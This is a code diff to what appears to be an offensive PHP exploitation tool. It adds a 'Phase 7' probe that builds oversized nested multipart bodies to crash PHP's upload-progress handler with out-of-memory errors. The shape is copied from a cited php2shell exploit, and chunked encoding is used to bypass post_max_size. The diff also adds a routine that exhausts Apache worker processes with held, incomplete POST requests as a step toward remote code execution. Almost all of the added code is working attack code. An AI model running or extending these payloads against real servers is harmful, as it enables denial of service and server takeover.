@@ -11,6 +11,8 @@ prerequisites for at least one chain are satisfied.
 from __future__ import annotations
 
 import re
+import socket
+import time
 from base64 import b64decode
 from dataclasses import dataclass, field
 from typing import Any, Dict, List, Optional, Set, Tuple
@@ -222,6 +224,10 @@ class DiscoverResult:
     framework_version: Optional[str] = None
     log_poisoning_path: Optional[str] = None
     log_poisoning_log: Optional[str] = None
+    oom_vulnerable: bool = False
+    oom_status_code: Optional[int] = None
+    oom_body_snippet: Optional[str] = None
+    oom_sapi_is_mod_php: Optional[bool] = None
     discovered_pages: List[str] = field(default_factory=list)
     discovered_params: Dict[str, List[str]] = field(default_factory=dict)
     crawled_pages: List[str] = field(default_factory=list)
@@ -250,6 +256,10 @@ class DiscoverResult:
     def log_poison_ready(self) -> bool:
         return self.has_lfi and self.log_poisoning_path is not None
 
+    @property
+    def chain_d_ready(self) -> bool:
+        return self.oom_vulnerable and self.oom_sapi_is_mod_php is True
+
     def best_lfi(self) -> Optional[LfiEndpoint]:
         if not self.lfi_endpoints:
             return None
@@ -269,6 +279,9 @@ class DiscoverResult:
             "framework": self.framework,
             "log_poisoning_path": self.log_poisoning_path,
             "log_poisoning_log": self.log_poisoning_log,
+            "oom_vulnerable": self.oom_vulnerable,
+            "oom_status_code": self.oom_status_code,
+            "oom_sapi_is_mod_php": self.oom_sapi_is_mod_php,
             "discovered_pages": list(self.discovered_pages),
             "crawled_pages": list(self.crawled_pages),
             "notes": list(self.notes),
@@ -1044,6 +1057,198 @@ def spider_pages(
 
 
 # ---------------------------------------------------------------------------
+# Phase 7: OOM probe (Chain D prerequisite)
+# ---------------------------------------------------------------------------
+
+_OOM_DETECT = re.compile(
+    r"Allowed memory size|memory exhausted|Fatal error.*memory", re.I
+)
+
+
+def _nest_name(i: int, depth: int, key_pad: int = 90) -> bytes:
+    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)
+
+
+def build_oom_probe_body(
+    parts: int = 1200,
+    depth: int = 64,
+    big: int = 120,
+    big_len: int = 8000,
+    burners: int = 40,
+    burner_len: int = 8000,
+    progress_len: int = 8000,
+    boundary: str = "C" * 10,
+) -> bytes:
+    """Build a multipart body designed to trigger OOM in PHP's session
+    upload_progress handler via nested file fields + large values.
+
+    Shape matches the proven A1 configuration from 9bie/php2shell-bypass-aslr-exp.
+    """
+    b = boundary.encode()
+    out = bytearray()
+
+    def part(name: bytes, value: bytes = b"", filename: Optional[bytes] = None,
+             ctype: Optional[bytes] = None) -> None:
+        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
+        if filename is not None:
+            out.extend(b"; filename=\"" + filename + b"\"")
+        out.extend(b"\r\n")
+        if ctype is not None:
+            out.extend(b"Content-Type: " + ctype + b"\r\n")
+        out.extend(b"\r\n" + value + b"\r\n")
+
+    part(b"PHPSESSID", b"\x00")
+    for i in range(parts):
+        is_mixed = i == 0
+        is_mixed2 = i == 1
+        ctype = b"C" * 103 if is_mixed else (b"C" * 231 if is_mixed2 else b"application/octet-stream")
+        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
+                   _nest_name(i, depth) + b"\"")
+        if is_mixed or is_mixed2:
+            out.extend(b"; filename=\"A\"")
+        else:
+            out.extend(b"; filename=\"\"")
+        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
+    for i in range(14):
+        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
+    for i in range(big):
+        part(("b%04d" % i).encode(), b"B" * big_len)
+    for i in range(burners):
+        part(("u%02d" % i).encode(), b"U" * burner_len)
+    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
+    out.extend(b"--" + b + b"--\r\n")
+    return bytes(out)
+
+
+def build_oom_lite_body(
+    parts: int = 600,
+    depth: int = 48,
+    boundary: str = "C" * 10,
+) -> bytes:
+    """Lighter OOM probe body — fewer parts, just enough to detect vulnerability
+    without necessarily achieving full exploitation."""
+    b = boundary.encode()
+    out = bytearray()
+
+    def part(name: bytes, value: bytes = b"") -> None:
+        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
+        out.extend(b"; filename=\"\"")
+        out.extend(b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n")
+
+    out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n\x00\r\n")
+    for i in range(parts):
+        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
+                   _nest_name(i, depth, key_pad=50) + b"\"")
+        out.extend(b"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n")
+    for i in range(30):
+        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"b%04d\"\r\n\r\n" % i)
+        out.extend(b"B" * 8000 + b"\r\n")
+    out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n")
+    out.extend(b"k" * 4000 + b"\r\n")
+    out.extend(b"--" + b + b"--\r\n")
+    return bytes(out)
+
+
+def probe_oom(
+    client: HttpClient,
+    profile: TargetProfile,
+    store: Any,
+    budget: DiscoverBudget,
+    timeout: float = 30.0,
+) -> Dict[str, Any]:
+    """Send a chunked multipart POST designed to trigger PHP OOM.
+
+    Returns dict with 'triggered', 'status', 'body_snippet', 'evidence_ref'.
+    Uses chunked Transfer-Encoding to bypass post_max_size.
+    """
+    result: Dict[str, Any] = {
+        "triggered": False,
+        "status": None,
+        "body_snippet": None,
+        "evidence_ref": None,
+    }
+    if not budget.can_spend():
+        return result
+
+    body = build_oom_probe_body()
+    boundary = "C" * 10
+    nonce = new_nonce("P2SOOM")
+    headers: Dict[str, str] = {
+        "Content-Type": f"multipart/form-data; boundary={boundary}",
+    }
+
+    try:
+        exchange = client.request(
+            "POST", profile.base_url,
+            body=body, headers=headers,
+            chunked=True, nonce=nonce, timeout=timeout,
+        )
+    except Exception:
+        budget.spend()
+        return result
+
+    budget.spend()
+    classification = classify(exchange, nonce=nonce)
+    item = store.add_http(
+        exchange, classification,
+        scenario_id="discover-oom-probe",
+        trust="medium",
+        notes="OOM probe: chunked multipart with nested fields",
+    )
+    result["evidence_ref"] = item.id
+    result["status"] = exchange.status
+
+    body_text = _body_text(exchange)
+    if exchange.status == 500 or exchange.status == 502:
+        result["triggered"] = True
+        if _OOM_DETECT.search(body_text):
+            result["body_snippet"] = body_text[:200]
+        elif not body_text:
+            result["body_snippet"] = "(empty 500 response — likely OOM bailout)"
+    elif _OOM_DETECT.search(body_text):
+        result["triggered"] = True
+        result["body_snippet"] = body_text[:200]
+
+    return result
+
+
+def hold_workers(
+    host: str,
+    port: int,
+    workers: int,
+    timeout: float = 60.0,
+) -> List[socket.socket]:
+    """Occupy all but one prefork child with incomplete POST bodies.
+
+    Returns the list of held sockets. Caller must close them when done.
+    """
+    holders: List[socket.socket] = []
+    if workers <= 1:
+        return holders
+    n = workers - 1
+    for _ in range(n):
+        try:
+            s = socket.create_connection((host, port), timeout=5)
+            s.sendall(b"POST /index.php HTTP/1.1\r\nHost: " + host.encode() + b"\r\n"
+                      b"Content-Type: application/x-www-form-urlencoded\r\n"
+                      b"Content-Length: 1048576\r\n\r\nx")
+            holders.append(s)
+        except OSError:
+            break
+        time.sleep(0.01)
+    time.sleep(0.5)
+    return holders
+
+
+def release_workers(holders: List[socket.socket]) -> None:
+    for s in holders:
+        try:
+            s.close()
+        except OSError:
+            pass
+
+
+# ---------------------------------------------------------------------------
 # Phase 6: framework detection
 # ---------------------------------------------------------------------------
 
@@ -1225,6 +1430,28 @@ def run_discovery(
             _log("no readable log files found via LFI")
     elif lfi_endpoints and result.wrapper_works:
         _log("phase 5: skipped (wrapper execution available, log poisoning unnecessary)")
+
+    # --- Phase 7: OOM probe (Chain D prerequisite) ---
+    sapi = getattr(profile, "sapi", None)
+    is_mod_php = sapi in ("mod_php", "apache2handler")
+    if is_mod_php and budget.can_spend():
+        _log("phase 7: probing OOM vulnerability (Chain D prerequisite)")
+        oom = probe_oom(client, profile, store, budget, timeout)
+        result.oom_vulnerable = oom["triggered"]
+        result.oom_status_code = oom["status"]
+        result.oom_body_snippet = oom["body_snippet"]
+        result.oom_sapi_is_mod_php = True
+        if oom["evidence_ref"]:
+            result.evidence_refs.append(oom["evidence_ref"])
+        if oom["triggered"]:
+            _log(f"OOM triggered! status={oom['status']} — Chain D may be viable")
+        else:
+            _log(f"OOM probe negative (status={oom['status']})")
+    elif not is_mod_php and sapi:
+        _log(f"phase 7: skipped (SAPI={sapi}, Chain D requires mod_php)")
+        result.oom_sapi_is_mod_php = False
+    else:
+        _log("phase 7: skipped (SAPI unknown)")
 
     result.allow_url_include = result.phpinfo.allow_url_include
     result.requests_used = budget.used
